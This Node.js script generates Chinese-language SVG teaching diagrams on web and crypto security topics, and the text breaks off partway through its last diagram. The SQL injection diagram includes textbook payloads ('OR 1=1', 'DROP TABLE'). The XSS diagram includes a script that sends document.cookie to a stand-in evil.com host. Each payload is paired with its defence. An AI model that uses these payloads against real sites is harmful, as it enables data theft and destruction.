const fs = require('fs');
const path = require('path');
const sharp = require('sharp');

const outDir = '/Users/leiwen/WorkBuddy/kepu/images/chapter4';

const baseStyle = `
<defs>
  <filter id="pencil">
    <feTurbulence type="fractalNoise" baseFrequency="0.04" numOctaves="3" result="noise" />
    <feDisplacementMap in="SourceGraphic" in2="noise" scale="1.2" />
  </filter>
</defs>
<rect width="800" height="500" fill="#F9F7F0" />
<g stroke="#DDD6C0" stroke-width="1">
  <line x1="0" y1="60" x2="800" y2="60" />
  <line x1="0" y1="100" x2="800" y2="100" />
  <line x1="0" y1="140" x2="800" y2="140" />
  <line x1="0" y1="180" x2="800" y2="180" />
  <line x1="0" y1="220" x2="800" y2="220" />
  <line x1="0" y1="260" x2="800" y2="260" />
  <line x1="0" y1="300" x2="800" y2="300" />
  <line x1="0" y1="340" x2="800" y2="340" />
  <line x1="0" y1="380" x2="800" y2="380" />
  <line x1="0" y1="420" x2="800" y2="420" />
  <line x1="0" y1="460" x2="800" y2="460" />
</g>
<line x1="60" y1="0" x2="60" y2="500" stroke="#D88A8A" stroke-width="2" />
`;

const marker = `<defs><marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L0,6 L9,3 z" fill="#666" /></marker></defs>`;

const svgs = {
  'q46-hash-encrypt-sign': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">哈希 vs 加密 vs 签名</text>
<rect x="80" y="80" width="180" height="140" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="120" y="110" font-size="14" fill="#4A6FA5" font-weight="bold">哈希 Hash</text>
<text x="90" y="140" font-size="12" fill="#333">单向：不可逆</text>
<text x="90" y="165" font-size="12" fill="#333">无密钥</text>
<text x="90" y="190" font-size="12" fill="#333">用途：密码存储</text>
<text x="90" y="210" font-size="12" fill="#333">完整性校验</text>
<rect x="310" y="80" width="180" height="140" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="350" y="110" font-size="14" fill="#6B8E23" font-weight="bold">加密 Encrypt</text>
<text x="320" y="140" font-size="12" fill="#333">双向：可逆</text>
<text x="320" y="165" font-size="12" fill="#333">需要密钥</text>
<text x="320" y="190" font-size="12" fill="#333">用途：保护机密</text>
<text x="320" y="210" font-size="12" fill="#333">AES / RSA</text>
<rect x="540" y="80" width="180" height="140" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="580" y="110" font-size="14" fill="#A56F4A" font-weight="bold">签名 Sign</text>
<text x="550" y="140" font-size="12" fill="#333">验证：不可逆</text>
<text x="550" y="165" font-size="12" fill="#333">私钥签 / 公钥验</text>
<text x="550" y="190" font-size="12" fill="#333">用途：身份认证</text>
<text x="550" y="210" font-size="12" fill="#333">不可抵赖</text>
<text x="80" y="280" font-size="13" fill="#333">password --hash--> a3f5b8c2... （知道结果算不出原文）</text>
<text x="80" y="310" font-size="13" fill="#333">plaintext --encrypt(key)--> cipher --decrypt(key)--> plaintext</text>
<text x="80" y="340" font-size="13" fill="#333">message --hash--> digest --sign(privateKey)--> signature</text>
<text x="80" y="380" font-size="12" fill="#666">密码存哈希不存加密；传输用加密；身份认证用签名</text>
${marker}
</svg>`,

  'q47-password-salt': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">密码加盐：防彩虹表攻击</text>
<text x="80" y="85" font-size="13" fill="#D88A8A" font-weight="bold">不加盐（有漏洞）：</text>
<rect x="80" y="100" width="640" height="80" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="100" y="125" font-size="12" fill="#333">用户A  password=123456  hash=abcd1234...</text>
<text x="100" y="145" font-size="12" fill="#333">用户B  password=123456  hash=abcd1234...</text>
<text x="100" y="165" font-size="12" fill="#D88A8A">→ 相同密码=相同哈希 → 彩虹表批量破解</text>
<text x="80" y="220" font-size="13" fill="#6B8E23" font-weight="bold">加盐（正确做法）：</text>
<rect x="80" y="235" width="640" height="100" rx="4" fill="none" stroke="#6B8E23" stroke-width="1.5" />
<text x="100" y="260" font-size="12" fill="#333">用户A  salt=x7k9  hash(123456 + x7k9) = f8a2b5...</text>
<text x="100" y="285" font-size="12" fill="#333">用户B  salt=m3p1  hash(123456 + m3p1) = c9d4e7...</text>
<text x="100" y="310" font-size="12" fill="#6B8E23">→ 相同密码+不同盐=不同哈希 → 彩虹表失效</text>
<text x="100" y="325" font-size="12" fill="#6B8E23">→ 每个用户需单独计算，无法批量破解</text>
<text x="80" y="375" font-size="12" fill="#333">盐是随机字符串，每个用户独立生成，与密码拼接后一起哈希</text>
<text x="80" y="400" font-size="12" fill="#333">现代推荐：bcrypt / scrypt / Argon2（内置盐+慢哈希）</text>
${marker}
</svg>`,

  'q48-cert-chain': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">HTTPS 证书链验证</text>
<rect x="300" y="80" width="200" height="70" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="330" y="110" font-size="13" fill="#D88A8A" font-weight="bold">Root CA</text>
<text x="330" y="130" font-size="11" fill="#333">自签名根证书</text>
<text x="330" y="145" font-size="11" fill="#333">预装在操作系统中</text>
<rect x="300" y="200" width="200" height="70" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="330" y="230" font-size="13" fill="#A56F4A" font-weight="bold">Intermediate CA</text>
<text x="330" y="250" font-size="11" fill="#333">由 Root CA 签发</text>
<text x="330" y="265" font-size="11" fill="#333">隔离保护 Root</text>
<rect x="300" y="320" width="200" height="70" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="350" y="350" font-size="13" fill="#6B8E23" font-weight="bold">Server Cert</text>
<text x="330" y="370" font-size="11" fill="#333">由 Intermediate 签发</text>
<text x="330" y="385" font-size="11" fill="#333">含域名+公钥</text>
<line x1="400" y1="150" x2="400" y2="200" stroke="#666" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrow)" />
<text x="410" y="180" font-size="11" fill="#666">签名</text>
<line x1="400" y1="270" x2="400" y2="320" stroke="#666" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrow)" />
<text x="410" y="300" font-size="11" fill="#666">签名</text>
<text x="80" y="440" font-size="12" fill="#333">浏览器验证：Server → Intermediate签名 → Root签名 → Root在本地受信→通过</text>
${marker}
</svg>`,

  'q49-sql-injection': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">SQL 注入原理</text>
<rect x="80" y="80" width="640" height="70" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="90" y="105" font-size="12" fill="#D88A8A" font-weight="bold">漏洞代码：</text>
<text x="90" y="130" font-size="12" fill="#333">sql = "SELECT * FROM users WHERE name='" + input + "'"</text>
<text x="90" y="145" font-size="12" fill="#333">input = "admin' OR '1'='1"</text>
<rect x="80" y="170" width="640" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="90" y="195" font-size="12" fill="#A56F4A" font-weight="bold">拼接结果：</text>
<text x="90" y="215" font-size="12" fill="#333">SELECT * FROM users WHERE name='admin' OR '1'='1'</text>
<rect x="80" y="240" width="640" height="60" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="90" y="265" font-size="12" fill="#D88A8A" font-weight="bold">'1'='1' 恒为真 → 返回所有用户数据 → 整库泄露</text>
<text x="90" y="285" font-size="12" fill="#D88A8A">进一步：'; DROP TABLE users; -- → 删表</text>
<rect x="80" y="320" width="640" height="70" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="90" y="345" font-size="12" fill="#6B8E23" font-weight="bold">正确做法：参数化查询（预编译）</text>
<text x="90" y="370" font-size="12" fill="#333">sql = "SELECT * FROM users WHERE name=?"</text>
<text x="90" y="385" font-size="12" fill="#333">input 作为参数传入 → 数据库知道这是值不是SQL语句 → 注入失效</text>
<text x="80" y="420" font-size="12" fill="#666">本质：永远不要拼接SQL，用参数化查询让数据库区分"代码"和"数据"</text>
${marker}
</svg>`,

  'q50-xss': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">XSS 跨站脚本攻击</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="110" font-size="13" fill="#333">攻击者</text>
<rect x="300" y="80" width="150" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="315" y="110" font-size="13" fill="#D88A8A">评论区留言</text>
<rect x="550" y="80" width="150" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="570" y="110" font-size="13" fill="#A56F4A">受害者浏览器</text>
<line x1="200" y1="105" x2="300" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="210" y="95" font-size="11" fill="#666">发恶意脚本</text>
<line x1="450" y1="105" x2="550" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="460" y="95" font-size="11" fill="#666">其他人打开页面</text>
<rect x="80" y="170" width="640" height="60" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="90" y="195" font-size="12" fill="#D88A8A" font-weight="bold">恶意留言内容：</text>
<text x="90" y="220" font-size="12" fill="#333">&lt;script&gt;fetch('evil.com?cookie='+document.cookie)&lt;/script&gt;</text>
<rect x="80" y="250" width="640" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="90" y="275" font-size="12" fill="#A56F4A" font-weight="bold">如果服务器不过滤直接展示：</text>
<text x="90" y="295" font-size="12" fill="#333">浏览器把留言当HTML执行 → 偷Cookie → 劫持登录态</text>
<rect x="80" y="320" width="640" height="70" rx="4" fill="none" stroke="#6B8E23" stroke-width="1.5" />
<text x="90" y="345" font-size="12" fill="#6B8E23" font-weight="bold">防御：输出转义（HTML Entity Encode）</text>
<text x="90" y="370" font-size="12" fill="#333">&lt; → &amp;lt;  &gt; → &amp;gt;  脚本变成文本不再执行</text>
<text x="90" y="385" font-size="12" fill="#333">CSP策略：只允许加载指定域的脚本</text>
${marker}
</svg>`,

  'q51-csrf': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">CSRF 跨站请求伪造</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="110" font-size="13" fill="#333">受害者</text>
<rect x="280" y="80" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="295" y="110" font-size="13" fill="#6B8E23">银行网站</text>
<text x="295" y="125" font-size="11" fill="#333">已登录</text>
<rect x="280" y="170" width="120" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="295" y="200" font-size="13" fill="#D88A8A">恶意网站</text>
<rect x="500" y="120" width="200" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="520" y="150" font-size="12" fill="#A56F4A">转账请求被自动发出</text>
<line x1="200" y1="105" x2="280" y2="105" stroke="#6B8E23" stroke-width="1" marker-end="url(#arrow)" />
<text x="210" y="95" font-size="11" fill="#666">1.登录银行</text>
<line x1="200" y1="120" x2="280" y2="195" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<text x="210" y="140" font-size="11" fill="#666">2.诱导访问恶意站</text>
<line x1="400" y1="195" x2="500" y2="145" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<text x="410" y="170" font-size="11" fill="#666">3.自动携带Cookie发请求</text>
<line x1="500" y1="170" x2="340" y2="130" stroke="#A56F4A" stroke-width="1" marker-end="url(#arrow)" />
<text x="420" y="125" font-size="11" fill="#A56F4A">4.银行以为是本人操作</text>
<rect x="80" y="260" width="640" height="80" rx="4" fill="none" stroke="#6B8E23" stroke-width="1.5" />
<text x="90" y="285" font-size="12" fill="#6B8E23" font-weight="bold">防御：</text>
<text x="90" y="305" font-size="12" fill="#333">1. CSRF Token：服务端发随机Token，请求必须带Token验证</text>
<text x="90" y="325" font-size="12" fill="#333">2. SameSite Cookie：限制Cookie跨站携带</text>
<text x="80" y="380" font-size="12" fill="#666">CSRF利用的是"浏览器自动带Cookie"——核心是让请求携带只有本站能生成的凭证</text>
${marker}
</svg>`,

  'q52-ddos': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">DDoS 分布式拒绝服务攻击</text>
<rect x="300" y="200" width="150" height="80" rx="4" fill="none" stroke="#D88A8A" stroke-width="2.5" />
<text x="335" y="230" font-size="14" fill="#D88A8A" font-weight="bold">目标服务器</text>
<text x="325" y="255" font-size="12" fill="#333">带宽/CPU耗尽</text>
<text x="320" y="275" font-size="12" fill="#D88A8A">正常用户无法访问</text>
<rect x="80" y="80" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="90" y="105" font-size="11" fill="#A56F4A">Bot 1</text>
<rect x="80" y="140" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="90" y="165" font-size="11" fill="#A56F4A">Bot 2</text>
<rect x="80" y="200" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="90" y="225" font-size="11" fill="#A56F4A">Bot 3</text>
<rect x="80" y="260" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="90" y="285" font-size="11" fill="#A56F4A">Bot 4</text>
<rect x="80" y="320" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="90" y="345" font-size="11" fill="#A56F4A">Bot N</text>
<rect x="580" y="80" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="590" y="105" font-size="11" fill="#A56F4A">Bot 5</text>
<rect x="580" y="140" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="590" y="165" font-size="11" fill="#A56F4A">Bot 6</text>
<rect x="580" y="200" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="590" y="225" font-size="11" fill="#A56F4A">Bot 7</text>
<rect x="580" y="260" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="590" y="285" font-size="11" fill="#A56F4A">Bot 8</text>
<rect x="580" y="320" width="80" height="40" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
<text x="590" y="345" font-size="11" fill="#A56F4A">Bot N</text>
<line x1="160" y1="100" x2="300" y2="210" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="160" y1="160" x2="300" y2="220" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="160" y1="220" x2="300" y2="230" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="160" y1="280" x2="300" y2="245" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="580" y1="100" x2="450" y2="210" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="580" y1="160" x2="450" y2="220" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="580" y1="220" x2="450" y2="230" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="580" y1="280" x2="450" y2="245" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<text x="80" y="400" font-size="12" fill="#333">Botnet：被感染的设备群 → 同时发海量请求 → 耗尽带宽/连接数/CPU</text>
<text x="80" y="425" font-size="12" fill="#6B8E23">防御：CDN分散流量 / WAF过滤 / 流量清洗中心 / Anycast路由</text>
${marker}
</svg>`,

  'q53-risk-control': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">风控系统：多层规则引擎</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="110" font-size="13" fill="#333">用户行为</text>
<rect x="280" y="80" width="130" height="200" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="300" y="110" font-size="13" fill="#A56F4A" font-weight="bold">规则引擎</text>
<text x="295" y="140" font-size="11" fill="#333">第1层：设备指纹</text>
<text x="295" y="160" font-size="11" fill="#333">（同一设备多账号？）</text>
<text x="295" y="190" font-size="11" fill="#333">第2层：频率统计</text>
<text x="295" y="210" font-size="11" fill="#333">（1分钟操作50次？）</text>
<text x="295" y="240" font-size="11" fill="#333">第3层：行为序列</text>
<text x="295" y="260" font-size="11" fill="#333">（异常时间操作？）</text>
<rect x="500" y="80" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="520" y="110" font-size="13" fill="#6B8E23">放行</text>
<rect x="500" y="150" width="120" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="520" y="180" font-size="13" fill="#A56F4A">二次验证</text>
<rect x="500" y="220" width="120" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="520" y="250" font-size="13" fill="#D88A8A">拦截封号</text>
<line x1="200" y1="105" x2="280" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="410" y1="105" x2="500" y2="105" stroke="#6B8E23" stroke-width="1" marker-end="url(#arrow)" />
<line x1="410" y1="180" x2="500" y2="175" stroke="#A56F4A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="410" y1="250" x2="500" y2="245" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<rect x="280" y="310" width="340" height="60" rx="4" fill="none" stroke="#333" stroke-width="1.5" />
<text x="300" y="335" font-size="12" fill="#333">ML模型层：基于历史数据训练异常检测模型</text>
<text x="300" y="355" font-size="12" fill="#333">特征：IP/设备/频率/金额/关系图谱</text>
<text x="80" y="410" font-size="12" fill="#666">风控不是"阻止坏人"——是在误杀率（误封正常用户）和漏杀率（放过坏人）间找平衡</text>
${marker}
</svg>`,

  'q54-oauth2': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">OAuth 2.0 授权码流程</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="110" font-size="13" fill="#333">用户</text>
<rect x="300" y="80" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="315" y="110" font-size="13" fill="#6B8E23">第三方App</text>
<rect x="550" y="80" width="140" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="560" y="110" font-size="13" fill="#A56F4A">微信Auth Server</text>
<line x1="200" y1="105" x2="300" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="210" y="95" font-size="11" fill="#333">1.点"微信登录"</text>
<line x1="420" y1="105" x2="550" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="430" y="95" font-size="11" fill="#333">2.跳转授权页</text>
<rect x="550" y="160" width="140" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="560" y="185" font-size="12" fill="#A56F4A">用户点"同意"</text>
<line x1="620" y1="130" x2="620" y2="160" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<rect x="300" y="160" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="310" y="185" font-size="12" fill="#6B8E23">收到授权码Code</text>
<line x1="550" y1="185" x2="420" y2="185" stroke="#666" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<text x="440" y="175" font-size="11" fill="#333">3.回调带Code</text>
<rect x="300" y="240" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="310" y="265" font-size="12" fill="#6B8E23">用Code换Token</text>
<line x1="420" y1="265" x2="550" y2="265" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="430" y="255" font-size="11" fill="#333">4.Code→Token</text>
<rect x="300" y="320" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="310" y="345" font-size="12" fill="#6B8E23">用Token取用户信息</text>
<text x="80" y="420" font-size="12" fill="#666">授权码模式：Code只能用一次且有时效 → 防止Token被截获</text>
${marker}
</svg>`,

  'q55-sso': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">SSO 单点登录</text>
<rect x="320" y="80" width="160" height="60" rx="4" fill="none" stroke="#A56F4A" stroke-width="2.5" />
<text x="350" y="110" font-size="14" fill="#A56F4A" font-weight="bold">SSO 认证中心</text>
<text x="345" y="130" font-size="11" fill="#333">统一登录入口</text>
<rect x="80" y="200" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="225" font-size="13" fill="#4A6FA5">OA系统</text>
<text x="95" y="245" font-size="11" fill="#333">无需登录</text>
<rect x="260" y="200" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="280" y="225" font-size="13" fill="#6B8E23">邮箱系统</text>
<text x="280" y="245" font-size="11" fill="#333">无需登录</text>
<rect x="440" y="200" width="120" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="460" y="225" font-size="13" fill="#A56F4A">HR系统</text>
<text x="460" y="245" font-size="11" fill="#333">无需登录</text>
<rect x="620" y="200" width="120" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="640" y="225" font-size="13" fill="#A56F4A">报销系统</text>
<text x="640" y="245" font-size="11" fill="#333">无需登录</text>
<line x1="380" y1="140" x2="140" y2="200" stroke="#A56F4A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<line x1="400" y1="140" x2="320" y2="200" stroke="#A56F4A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<line x1="420" y1="140" x2="500" y2="200" stroke="#A56F4A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<line x1="440" y1="140" x2="680" y2="200" stroke="#A56F4A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<text x="80" y="300" font-size="12" fill="#333">1. 首次访问OA → 跳转SSO → 登录 → 返回OA带Token</text>
<text x="80" y="325" font-size="12" fill="#333">2. 再访问邮箱 → 跳转SSO → 已登录 → 直接返回带Token</text>
<text x="80" y="350" font-size="12" fill="#333">3. 所有系统信任SSO签发的Token → 一次登录，全网通行</text>
<text x="80" y="390" font-size="12" fill="#666">SSO本质：把"认证"和"授权"分离——认证中心负责"你是谁"，各系统只管"你能干什么"</text>
${marker}
</svg>`,

  'q56-captcha': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">验证码军备竞赛</text>
<rect x="80" y="80" width="200" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="100" y="110" font-size="12" fill="#6B8E23">文字验证码（扭曲字母）</text>
<rect x="80" y="150" width="200" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="100" y="180" font-size="12" fill="#4A6FA5">滑动拼图验证</text>
<rect x="80" y="220" width="200" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="100" y="250" font-size="12" fill="#A56F4A">点选验证（选指定图标）</text>
<rect x="80" y="290" width="200" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="100" y="320" font-size="12" fill="#D88A8A">行为验证（鼠标轨迹分析）</text>
<rect x="80" y="360" width="200" height="50" rx="4" fill="none" stroke="#333" stroke-width="2" />
<text x="100" y="390" font-size="12" fill="#333">无感验证（设备指纹+风控）</text>
<line x1="280" y1="105" x2="350" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="280" y1="175" x2="350" y2="175" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="280" y1="245" x2="350" y2="245" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="280" y1="315" x2="350" y2="315" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="280" y1="385" x2="350" y2="385" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<rect x="350" y="80" width="200" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="370" y="110" font-size="12" fill="#D88A8A">OCR破解 → 被淘汰</text>
<rect x="350" y="150" width="200" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="370" y="180" font-size="12" fill="#D88A8A">图像识别破解 → 被淘汰</text>
<rect x="350" y="220" width="200" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="370" y="250" font-size="12" fill="#D88A8A">目标检测破解 → 被淘汰</text>
<rect x="350" y="290" width="200" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="370" y="320" font-size="12" fill="#D88A8A">轨迹模拟破解 → 被淘汰</text>
<rect x="350" y="360" width="200" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="1.5" />
<text x="370" y="390" font-size="12" fill="#6B8E23">综合风控 → 当前主流</text>
<text x="80" y="440" font-size="12" fill="#666">核心矛盾：对人简单的事，AI也能做。验证码从"人机区分"变成了"风险概率判断"</text>
${marker}
</svg>`,

  'q57-side-channel': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">侧信道攻击：从"旁门"泄露密钥</text>
<rect x="80" y="80" width="150" height="200" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="110" y="110" font-size="13" fill="#4A6FA5" font-weight="bold">加密模块</text>
<text x="95" y="140" font-size="11" fill="#333">输入：密文</text>
<text x="95" y="160" font-size="11" fill="#333">输出：明文</text>
<text x="95" y="200" font-size="11" fill="#D88A8A">侧信道信息：</text>
<text x="95" y="220" font-size="11" fill="#D88A8A">- 执行时间</text>
<text x="95" y="240" font-size="11" fill="#D88A8A">- 功耗变化</text>
<text x="95" y="260" font-size="11" fill="#D88A8A">- 电磁辐射</text>
<text x="95" y="280" fill="#D88A8A" font-size="11">- 缓存命中率</text>
<rect x="320" y="80" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="335" y="110" font-size="12" fill="#D88A8A">时间测量</text>
<rect x="320" y="150" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="335" y="180" font-size="12" fill="#D88A8A">功耗分析</text>
<rect x="320" y="220" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="335" y="250" font-size="12" fill="#D88A8A">电磁探测</text>
<rect x="320" y="290" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="335" y="320" font-size="12" fill="#D88A8A">缓存侧信道</text>
<line x1="230" y1="100" x2="320" y2="105" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<line x1="230" y1="175" x2="320" y2="175" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<line x1="230" y1="245" x2="320" y2="245" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<line x1="230" y1="280" x2="320" y2="310" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<rect x="520" y="80" width="180" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="540" y="110" font-size="12" fill="#A56F4A">推导密钥的某一位</text>
<rect x="520" y="150" width="180" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="540" y="180" font-size="12" fill="#A56F4A">逐位恢复完整密钥</text>
<line x1="450" y1="105" x2="520" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="450" y1="175" x2="520" y2="175" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="450" y1="245" x2="520" y2="175" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="450" y1="315" x2="520" y2="175" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="80" y="380" font-size="12" fill="#333">原理：密钥不同 → 不同分支执行 → CPU时间/功耗/缓存行为不同</text>
<text x="80" y="405" font-size="12" fill="#333">防御：恒定时间算法（所有分支执行相同操作）/ 加入随机延迟 / 屏蔽电磁</text>
<text x="80" y="430" font-size="12" fill="#6B8E23">著名案例：Meltdown/Spectre —— 利用CPU推测执行的缓存侧信道</text>
${marker}
</svg>`,

  'q58-api-rate-limit': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
